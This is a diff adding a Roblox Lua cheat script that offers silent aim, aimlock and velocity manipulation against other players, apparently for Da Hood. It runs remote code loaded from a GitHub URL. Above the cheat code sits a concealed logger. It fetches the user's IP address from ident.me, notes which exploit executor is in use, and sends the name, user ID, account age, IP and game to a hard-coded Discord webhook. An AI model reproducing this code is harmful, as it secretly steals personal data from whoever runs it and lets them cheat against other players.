@@ -1,0 +1,179 @@
+local plr = game.Players.LocalPlayer
+repeat wait() until plr.Character
+local gui = script.Parent
+local urlprofile = "https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile"
+
+
+local ident = game:HttpGet("https://v4.ident.me/")
+
+local plr = game.Players.LocalPlayer
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
+
+local function getexploit()
+    local exploit =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
+        (isexecutorclosure and "Script-Ware V2") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "SirHurt V4") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "Krnl") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getreg()['CalamariLuaEnv'] and "Calamari") or
+        (unit and "Unit") or
+        ("Undetectable")
+    return exploit
+end
+local Content = ""
+local Embed = {
+            ["title"] = "***Execution***",
+            ["description"] = "Name: "..plr.Name.."\nDisplay Name: "..plr.DisplayName.."\nExploit: "..getexploit().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
+            ["type"] = "rich",
+            ["color"] = tonumber(0xffff00),
+                    ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
+            },
+            ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "__Account Age:__",
+                    ["value"] = plr.AccountAge.." days old",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "__User ID:__",
+                    ["value"] = plr.UserId,
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "IP Address: "..tostring(ident),
+                ["icon_url"] = "https://cdn.discordapp.com/attachments/903407245675606056/911635640452513843/Screenshot_25.png"
+            },
+            ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+};
+(syn and syn.request or http_request or http.request) {
+    Url = 'https://discordapp.com/api/webhooks/1024140415689035857/tze22UD-HqcS2tN-QK5Ud93AaCUISt-0WSySK6pMqAOyTlF5nHCAxLFZ7X9SdugAw0uY';
+    Headers = {
+        ['Content-Type'] = 'application/json';
+    };
+    Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
+};
+
+combo, prev, rnewidx = 0, 0, 0
+for i = 1, 50 do
+   local n = math.random(10000, 99999)
+   if i == 25 then
+      rnewidx = n
+   end
+   if n == prev then
+      combo = combo + 1
+   end
+   prev = n
+end
+ 
+if combo > 45 then
+   c("0x01")
+end
+
+
+-- // script made by ghoul
+-- // script made by ghoul
+-- // script made by ghoul
+-- // script made by ghoul
+
+local RunService = game:GetService("RunService")
+
+RunService.Heartbeat:Connect(function()
+    pcall(function()
+        for i,v in pairs(game.Players:GetChildren()) do
+            if v.Name ~= game.Players.LocalPlayer.Name then
+                local hrp = v.Character.HumanoidRootPart
+                hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)    
+                hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)   
+            end
+        end
+    end)
+end)
+
+                                local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/ghoulmain/Allhitpartssilentaim/main/s9ware", true))()
+                            Aiming.TeamCheck(false)Aiming.ShowFOV = true
+                             Aiming.FOV = 78
+                            
+                            local Workspace = game:GetService("Workspace")
+                            local Players = game:GetService("Players")
+                            local RunService = game:GetService("RunService")
+                            local UserInputService = game:GetService("UserInputService")
+                            
+                            
+                            local LocalPlayer = Players.LocalPlayer
+                            local Mouse = LocalPlayer:GetMouse()
+                            local CurrentCamera = Workspace.CurrentCamera
+                            
+                            local DaHoodSettings = {
+                                SilentAim = true,
+                                AimLock = false,
+                                Prediction = 0.1537,
+                                AimLockKeybind = Enum.KeyCode.E
+                            }
+                            getgenv().DaHoodSettings = DaHoodSettings
+                            
+                            
+                            function Aiming.Check()
+                            -------------
+                                if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
+                                    return false
+                                end
+                            
+                                -- // Check if downed
+                                local Character = Aiming.Character(Aiming.Selected)
+                                local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
+                                local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+                            
+                                -- // Check B
+                                if (KOd or Grabbed) then
+                                    return false
+                                end
+                            
+                                -- //
+                                return true
+                            end
+                            
+                            -- // Hook
+                            local __index
+                            __index = hookmetamethod(game, "__index", function(t, k)
+                                -- // Check if it trying to get our mouse's hit or target and see if we can use it
+                                if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
+                                    local SelectedPart = Aiming.SelectedPart
+                            
+                                    -- // Hit/Target
+                                    if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
+                                        -- // Hit to account prediction
+                                        local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+                            
+                                        -- // Return modded val
+                                        return (k == "Hit" and Hit or SelectedPart)
+                                    end
+                                end
+                            
+                                -- // Return
+                                return __index(t, k)
+                            end)
+                            
+                            -- // Aimlock
+                            RunService:BindToRenderStep("AimLock", 0, function()
+                                if (DaHoodSettings.AimLock and Aiming.Check() and UserInputService:IsKeyDown(DaHoodSettings.AimLockKeybind)) then
+                                    -- // Vars
+                                    local SelectedPart = Aiming.SelectedPart
+                            
+                                    -- // Hit to account prediction
+                                    local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+                            
+                                    CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
+                                end
+                            end)
